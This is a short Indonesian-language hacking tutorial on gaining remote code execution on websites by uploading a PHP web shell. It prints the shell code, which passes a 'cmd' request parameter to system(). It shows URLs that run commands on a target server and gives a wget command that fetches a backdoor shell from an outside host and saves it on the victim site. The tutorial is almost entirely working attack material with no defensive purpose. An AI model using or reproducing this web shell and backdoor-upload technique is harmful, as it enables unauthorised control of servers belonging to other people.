### Remote Code Execution

Basic For Remote Code Execution ( Critical )

Contoh Kasus Nya Kayak Gini Lur

```
<style>body{font-size: 0;}h1{font-size: 12px}</style><h1>
<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="http://dyan6etar.cf/shell.txt" border=0>
';}__halt_compiler();?></h1>
```

### Basic Rce

Misal Gua Upload File : rce.php

Request Dari php nya adalah = cmd

Cara Akses ? :
```
http://site.com/rce.php?cmd=
```

Oke Kita Jalankan Beberapa Perintah Dasar RCE
```
http://site.com/rce.php?cmd=ls
http://site.com/rce.php?cmd=whoami
http://site.com/rce.php?cmd=uname -a
http://site.com/rce.php?cmd=id
```

### Reverse Shell Via RCE
Kita Menggunakan Command wget 
```
http://site.com/rce.php?cmd=wget http://dyan6etar.cf/shell.txt -O namashell.php
```

### Penjelasan Singkat
Penjelasan Singkat Tentang Command wget :

wget menurut Otak Menarik File Dari Luar Server dan Juga Membuat Di Dalam Server

Sedangkan -O Untuk Menamakan File Tersebut 

Tentu Saja Ini Bisa Di Manfaatkan Untuk Up Shell BackDoor

Oke Sekian Sayang:v
